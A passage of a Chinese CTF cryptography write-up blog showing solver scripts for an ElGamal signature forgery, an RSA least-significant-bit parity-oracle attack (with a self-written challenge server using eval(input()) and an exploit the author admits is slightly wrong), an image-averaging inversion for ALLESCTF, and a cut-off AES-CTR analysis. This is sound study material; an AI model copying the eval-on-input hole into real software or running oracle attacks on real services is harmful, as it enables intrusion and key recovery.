<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd, invert</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MASK = <span class="number">2</span> ** <span class="number">1024</span> - <span class="number">1</span></span><br><span class="line">g = <span class="number">3</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u = <span class="string">b&#x27;Felicity Cisco&#x27;</span>.<span class="built_in">hex</span>()</span><br><span class="line">    sh = process([<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;./forgery.py&quot;</span>])</span><br><span class="line">    content = sh.recvuntil(<span class="string">b&#x27;Answer:&#x27;</span>).decode()</span><br><span class="line">    p, _, y = findall(<span class="string">r&quot;\d+&quot;</span>, content)</span><br><span class="line">    p, y = <span class="built_in">int</span>(p), <span class="built_in">int</span>(y)</span><br><span class="line">    B, C = randint(<span class="number">2</span>, p - <span class="number">2</span>), randint(<span class="number">2</span>, p - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> gcd(C, p - <span class="number">1</span>) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    r = <span class="built_in">pow</span>(g, B, p) * <span class="built_in">pow</span>(y, C, p) % p</span><br><span class="line">    s = -r * invert(C, p - <span class="number">1</span>) % (p - <span class="number">1</span>)</span><br><span class="line">    u = u + <span class="built_in">hex</span>(-r * invert(C, p - <span class="number">1</span>) * B % (p - <span class="number">1</span>))[<span class="number">2</span>:].rjust(<span class="number">1024</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    sh.sendline(u)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;r:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(r))</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;s:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(s))</span><br><span class="line">    flag = sh.recvall()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="RSA-Pop-Quiz（unsolved）"><a href="#RSA-Pop-Quiz（unsolved）" class="headerlink" title="RSA Pop Quiz（unsolved）"></a>RSA Pop Quiz（unsolved）</h2><blockquote>
<p>nc crypto.chal.csaw.io 5008</p>
</blockquote>
<blockquote>
<p>Wiener wiener chicken dinner</p>
</blockquote>
<blockquote>
<p>Who came up with this math term anyway?</p>
</blockquote>
<p>来，学习一下<strong>Least Significant Bit Oracle Attack</strong></p>
<p>可惜已经第二天醒来，比赛已经结束了，服务也关了，苦露西，苦露西</p>
<p>来，学习一下<strong>Least Significant Bit Oracle Attack</strong></p>
<p>比赛要结束关我菜鸡什么事</p>
<hr>
<h3 id="Least-Significant-Bit-Oracle-Attack-（LSB-Oracle-Attack-Parity-Oracle）"><a href="#Least-Significant-Bit-Oracle-Attack-（LSB-Oracle-Attack-Parity-Oracle）" class="headerlink" title="Least Significant Bit Oracle Attack （LSB Oracle Attack / Parity Oracle）"></a>Least Significant Bit Oracle Attack （LSB Oracle Attack / Parity Oracle）</h3><p>该攻击使用的条件很简单，我们可以进行解密，并且会有oracle告诉我们明文的奇偶性，时间复杂度是$O(logN)$</p>
<p>假设已知的为enc，我们构造密文C<br>$$<br>C=(2^e\cdot c)\ mod\ n=(2^e\cdot m^e)\ mod\ n=(2\cdot m)^e\ mod\ n<br>$$<br>我们将这个密文send过去，那么显然对应的明文就是$M=(2\cdot m)\ mod\ n$</p>
<p>oracle会告诉我们M的奇偶性，也就是最低位<code>lsb</code>是0还是1</p>
<p>由此我们可以进行推导，得出的结论如下</p>
<ul>
<li>如果<code>lsb</code>是0，说明$m&lt;\frac{n}{2}$</li>
<li>如果<code>lsb</code>是1，说明$m\geq \frac{n}{2}$；如果2m大于n，但注意m是不会超过n的，所以2m就不会超过2n，则$2m\ mod\ n=2m - n$，n是奇数，2m偶数，那么M是奇数，lsb是1</li>
</ul>
<p>这样一次就可以将m限定在$\frac{n}{2}$的左边后者是右边，之后就是不断地二分，知道找到真正的m。因为运用二分的思想，所以时间复杂度才会是$log$</p>
<p>接下来就是继续构造<br>$$<br>C=(2^e\cdot C)\ mod\ n=(2^e\cdot (2\cdot M)^e)\ mod\ n=(4\cdot m)^e\ mod\ n<br>$$<br>将C给send过去就可以在，获得oracle，就可以将C限定在$\frac{n}{4}$的空间里</p>
<hr>
<p>可惜坏境关了。。。</p>
<p>！！！环境关了就自己创造环境（感谢web服务端老师第一节课就要求我们买服务器，虽然刀了我九十九大洋，但不仅让我可以水一篇<a href="https://blog.csdn.net/m0_49109277/article/details/120402420">Crypto出题的博客</a>，以后还可和web和pwn一样复现环境）</p>
<p>诶呀，这题没有源码，woc，苦露西</p>
<p>自己写一个吧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid4</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"></span><br><span class="line">space = ascii_letters + digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    pt = <span class="string">&quot;&quot;</span>.join([space[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(space) - <span class="number">1</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])</span><br><span class="line">    ct = hashlib.sha256(pt.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SHA-256(XXXX+&#123;&#125;) == &#123;&#125;&quot;</span>.<span class="built_in">format</span>(pt[<span class="number">4</span>:], ct))</span><br><span class="line">    guess = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;please give me XXXX: &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> hashlib.sha256((guess + pt[<span class="number">4</span>:]).encode()).hexdigest() != ct:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sorry, it seems you are not qualified&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;&#x27;&#x27; ██       ██          ██                                          ██              ██        ████████ ██████</span></span><br><span class="line"><span class="string">░██      ░██         ░██                                         ░██             ░██       ██░░░░░░ ░█░░░░██</span></span><br><span class="line"><span class="string">░██   █  ░██  █████  ░██  █████   ██████  ██████████   █████    ██████  ██████   ░██      ░██       ░█   ░██</span></span><br><span class="line"><span class="string">░██  ███ ░██ ██░░░██ ░██ ██░░░██ ██░░░░██░░██░░██░░██ ██░░░██  ░░░██░  ██░░░░██  ░██      ░█████████░██████</span></span><br><span class="line"><span class="string">░██ ██░██░██░███████ ░██░██  ░░ ░██   ░██ ░██ ░██ ░██░███████    ░██  ░██   ░██  ░██      ░░░░░░░░██░█░░░░ ██</span></span><br><span class="line"><span class="string">░████ ░░████░██░░░░  ░██░██   ██░██   ░██ ░██ ░██ ░██░██░░░░     ░██  ░██   ░██  ░██             ░██░█    ░██</span></span><br><span class="line"><span class="string">░██░   ░░░██░░██████ ███░░█████ ░░██████  ███ ░██ ░██░░██████    ░░██ ░░██████   ░████████ ████████ ░███████</span></span><br><span class="line"><span class="string">░░       ░░  ░░░░░░ ░░░  ░░░░░   ░░░░░░  ░░░  ░░  ░░  ░░░░░░      ░░   ░░░░░░    ░░░░░░░░ ░░░░░░░░  ░░░░░░░&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid4()) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = invert(e, phi)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(banner)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e =&#x27;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line">choices = [<span class="string">&#x27;yes&#x27;</span>, <span class="string">&#x27;no&#x27;</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&#x27;do you wanna decrypt? (yes / no): &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> choice <span class="keyword">not</span> <span class="keyword">in</span> choices:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sorry! i can&#x27;t do this way &quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> choice == choices[<span class="number">0</span>]:</span><br><span class="line">        cx = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&#x27;please give me your ciphertext: &#x27;</span>))</span><br><span class="line">        mx = <span class="built_in">pow</span>(cx, d, n)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;this is what you want:&#x27;</span>, mx % <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tempt = <span class="built_in">input</span>(<span class="string">&#x27;tell me your plaintext: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> tempt == bytes_to_long(flag.encode()):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;congratulation! you are right: &#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;sorry! bye! &#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>exp差不多这样吧，有点奇怪，后面收尾的时候不太对</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"></span><br><span class="line">space = ascii_letters + digits</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;47.96.253.167&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work1</span>():</span></span><br><span class="line">    <span class="comment"># SHA-256(XXXX+8OeVCGS9zB8w) == c35d202a83694cfcace7a0cca784594ba3e984e3ced62714d08189d8bb03f6f0</span></span><br><span class="line">    proof = sh.recvuntil(<span class="string">b&#x27;please give me XXXX:&#x27;</span>)</span><br><span class="line">    tail = proof[<span class="number">13</span>:<span class="number">25</span>].decode()</span><br><span class="line">    HASH = proof[<span class="number">30</span>:<span class="number">94</span>].decode()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(space, repeat=<span class="number">4</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        t = hashlib.sha256((head+tail).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == HASH:</span><br><span class="line">            sh.sendline(head.encode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work2</span>():</span></span><br><span class="line">    <span class="comment"># SHA-256(XXXX+8OeVCGS9zB8w) == c35d202a83694cfcace7a0cca784594ba3e984e3ced62714d08189d8bb03f6f0</span></span><br><span class="line">    proof = sh.recvline()</span><br><span class="line">    tail = <span class="string">&#x27;35ec0130a578&#x27;</span></span><br><span class="line">    HASH = <span class="string">&#x27;25da550b7b027fb3b802bf1c0234c30b59f17ff3a2a7f6f33e3428e6c0d162df&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(space, repeat=<span class="number">4</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        t = hashlib.sha256((head+tail).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == HASH:</span><br><span class="line">            <span class="built_in">print</span>(head)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proof_of_work1()</span><br><span class="line">content = sh.recvuntil(<span class="string">b&#x27;do you wanna decrypt? (yes / no):&#x27;</span>).decode()</span><br><span class="line">n, e, c = [<span class="built_in">int</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> findall(<span class="string">r&#x27;\d+&#x27;</span>, content)]</span><br><span class="line">C = c</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = n - <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    m = (i + j) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> i &gt;= j:</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;please give me your ciphertext:&#x27;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(c))</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;this is what you want:&#x27;</span>)</span><br><span class="line">        ans = sh.recvline()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;1&#x27;</span> <span class="keyword">in</span> ans:</span><br><span class="line">        	<span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(<span class="number">2</span>*(m//<span class="number">2</span>)))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    sh.sendline(<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">    C = <span class="number">2</span> ** e * C % n</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;please give me your ciphertext:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(C))</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;this is what you want:&#x27;</span>)</span><br><span class="line">    ans = sh.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;0&#x27;</span> <span class="keyword">in</span> ans:</span><br><span class="line">        j = m</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b&#x27;1&#x27;</span> <span class="keyword">in</span> ans:</span><br><span class="line">        i = m</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210922223905766.png" alt="image-20210922223905766"></p>
<p>最后一位显然不对，应该是左花括号，不知道为什么</p>
<p>应该是少了一个直接加密c的结果，看了别的师傅的博客，最后要加一下，不过试过了不太行</p>
<p>最后一层套娃是泄漏d低位，也是可以解的，具体参考la佬的博客</p>
<h2 id="Bits（unsolved）"><a href="#Bits（unsolved）" class="headerlink" title="Bits（unsolved）"></a>Bits（unsolved）</h2><blockquote>
<p>I wrote this oracle in rust so that it can’t sue companies over java stuff.</p>
<p>Author: CryptoHack (<code>Robin_Jadoul</code> and <code>jack</code>)</p>
</blockquote>
<p>emmmm竟然是rust语言写的，有空学一下</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上午羊城杯结束，去看RCTF的密码，看的有点懵，看懂了代码之后就无从下手，两道密码，出的师傅还是大有人在的</p>
<p>然后下午看了hub上，发现错过了一些比赛的报名，就国外的CSAW开赛后还可以报，就在打了；做出一道签到，感觉有点打不动，倒不是题目难，感觉有点饱和，果然不能一天到晚坐在屏幕前面，多出去走走，运动运动，谈谈恋爱多好</p>
<p>菜归菜，还是要注意劳逸结合</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210904 ALLESCTFCrypto方向部分WP</title>
    <url>/posts/84da04f2/</url>
    <content><![CDATA[<p>woc，有点不对，有亿点不会</p>
<span id="more"></span>

<h1 id="ALLESCTF"><a href="#ALLESCTF" class="headerlink" title="ALLESCTF"></a>ALLESCTF</h1><h2 id="Crypto-Nostego（unsolved）"><a href="#Crypto-Nostego（unsolved）" class="headerlink" title="Crypto-Nostego（unsolved）"></a>Crypto-Nostego（unsolved）</h2><p>提供了一张图片，有一个脚本，使用该脚本对原本有flag的图片进行了加密，需要我们逆回去</p>
<p>关键代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        value = <span class="number">0</span></span><br><span class="line">        di, dj = <span class="number">1337</span>, <span class="number">42</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(ROUNDS):</span><br><span class="line">            di, dj = (di * di + dj) % width, (dj * dj + di) % height</span><br><span class="line">            value += image.getpixel(((i + di) % width, (j + dj + (i + di)//width) % height))</span><br><span class="line">        result.putpixel((i, j), value / ROUNDS)</span><br></pre></td></tr></table></figure>

<p>赛后看了<a href="https://ctf.rip/write-ups/crypto/alles-nostego/">一位师傅的WP</a>，不是特别懂，感觉这位师傅找到门道了，但是不是很正规哈哈哈</p>
<p>在复现中我产生一个思路，既然是收集32个点的平均值，那么要逆回去肯定不是很完美地得到（除非我想错了），而是一种逼近：每一次反推的时候，通过一点，将其像素值（也就是另外32个点的平均值）直接赋给这32个点，当然这是一个不准确的预估。但如果这32个点被多次用到，那么每次赋给32个点的时候，与其原来的值取个平均值，这样只要被用到的次数足够，可以得到一个有点模糊的图像，也许就可以看出来了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: %s [infile] [outfile]&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">image = Image.<span class="built_in">open</span>(sys.argv[<span class="number">1</span>]).convert(<span class="string">&quot;F&quot;</span>)</span><br><span class="line">width, height = image.size</span><br><span class="line">result = Image.new(<span class="string">&quot;F&quot;</span>, (width, height))</span><br><span class="line"></span><br><span class="line">ROUNDS = <span class="number">32</span></span><br><span class="line">dic = &#123;(<span class="number">0x10001</span>, <span class="number">0x10001</span>): [<span class="number">0x10001</span>, <span class="number">1</span>]&#125;</span><br><span class="line"></span><br><span class="line">d = []</span><br><span class="line">di, dj = <span class="number">1337</span>, <span class="number">42</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ROUNDS):</span><br><span class="line">    di, dj = (di * di + dj) % width, (dj * dj + di) % height</span><br><span class="line">    d.append((di, dj))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        value = image.getpixel((i, j))</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> d[::-<span class="number">1</span>]:</span><br><span class="line">            di, dj = k[<span class="number">0</span>], k[<span class="number">1</span>]</span><br><span class="line">            x = (i + di) % width</span><br><span class="line">            y = (j + dj + (i + di)//width) % height</span><br><span class="line">            <span class="keyword">if</span> (x, y) <span class="keyword">not</span> <span class="keyword">in</span> dic.keys():</span><br><span class="line">                dic[(x, y)] = [value, <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dic[(x, y)][<span class="number">0</span>] += value</span><br><span class="line">                dic[(x, y)][<span class="number">1</span>] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        result.putpixel((i, j), dic[(i, j)][<span class="number">0</span>] / dic[(i, j)][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">result = result.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">result.save(sys.argv[<span class="number">2</span>])</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/ALLES.dec.png" alt="ALLES.dec"></p>
<p>竟然和那位师傅出来的差不多，好吧，虽然没看懂他的，但思路应该类似，确实不能完美还原</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/flag%EF%BC%9F.png" alt="flag？"></p>
<p>然后这位师傅借助工具看出来了，我不是很会用ps，稍微拉了下对比度，一个<code>!</code>和后面<code>c4n h4v3</code>有点看不清，就只能做到这一步吧</p>
<blockquote>
<p>ALLES!{why_so1v3_st3g0_wh3n_y0u_c4n_h4v3_crypto}</p>
</blockquote>
<p>或许还是有完美解吧，也正如这位师傅说的，就算有花的时间也比这个要多；接下去的思路，我想是多进行几遍解密，也许就可以，但事与愿违不知道为啥</p>
<p>在队友misc之神的帮助下，稍微能看点吧，看不清的地方爆破可还行；stego是真的费眼睛</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210906120605159.png" alt="image-20210906120605159"></p>
<h2 id="Crypto-Secure-Flag-Service（unsolved）"><a href="#Crypto-Secure-Flag-Service（unsolved）" class="headerlink" title="Crypto-Secure Flag Service（unsolved）"></a>Crypto-Secure Flag Service（unsolved）</h2><p>主函数如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        encrypted_password = base64.b64decode(<span class="built_in">input</span>(<span class="string">&#x27;Encrypted password&gt;&#x27;</span>))</span><br><span class="line">        password = decrypt(encrypted_password)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> password == PASSWORD:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(base64.b64encode(encrypt(FLAG)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Wrong Password!!!&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>You captured an encrypted password: <code>kgsekWGeAwPhz6tbMyLd34Bg5pwhy2TkQJF7NRYC987Ibuiu/dmNHqyYXHV0kXlksThSRi83Qu2owAiUdT9pfqlY</code></p>
</blockquote>
<p>通过交互得到的东西有点少，除非不断断开重连用作oracle</p>
<p>攻击点应该是针对AES.CTR的漏洞了，我们分别有flag和password的密文，以及他们各自的nonce，并且他们使用相同的密钥；所以流程图正如下图复制粘贴所示</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/ALLESaes.png" alt="ALLESaes"></p>
<p>保存一组数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># ncat --ssl 7b000000cf4ae1b3538a4d99-secure-flag-service.challenge.master.allesctf.net 31337</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA3_256, HMAC, BLAKE2s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int_to_bytes</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">return</span> i.to_bytes((i.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line">    bits = <span class="built_in">bin</span>(<span class="built_in">int</span>.from_bytes(s, byteorder=<span class="string">&#x27;big&#x27;</span>))[<span class="number">2</span>:]</span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> bits:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> random.randrange(<span class="number">0</span>, <span class="number">2</span>):</span><br><span class="line">                ret += <span class="string">&#x27;01&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ret += <span class="string">&#x27;10&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret += <span class="string">&#x27;00&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> int_to_bytes(<span class="built_in">int</span>(ret, base=<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">s</span>):</span></span><br><span class="line">    bits = <span class="built_in">bin</span>(<span class="built_in">int</span>.from_bytes(s, byteorder=<span class="string">&#x27;big&#x27;</span>))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(bits) % <span class="number">2</span>:</span><br><span class="line">        bits = <span class="string">&#x27;0&#x27;</span> + bits</span><br><span class="line"></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(bits[i] + bits[i + <span class="number">1</span>], base=<span class="number">2</span>):</span><br><span class="line">            ret += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> int_to_bytes(<span class="built_in">int</span>(ret, base=<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        aes = AES.new(key=encryption_key, mode=AES.MODE_CTR, nonce=c[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">        decrypted = aes.decrypt(c[<span class="number">8</span>:])</span><br><span class="line">        message, tag = decode(decrypted[:-<span class="number">16</span>]), decrypted[-<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">        HMAC.new(key=mac_key, msg=message).verify(mac_tag=tag)</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Get off my lawn or I call the police!!!&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encrypted_password = <span 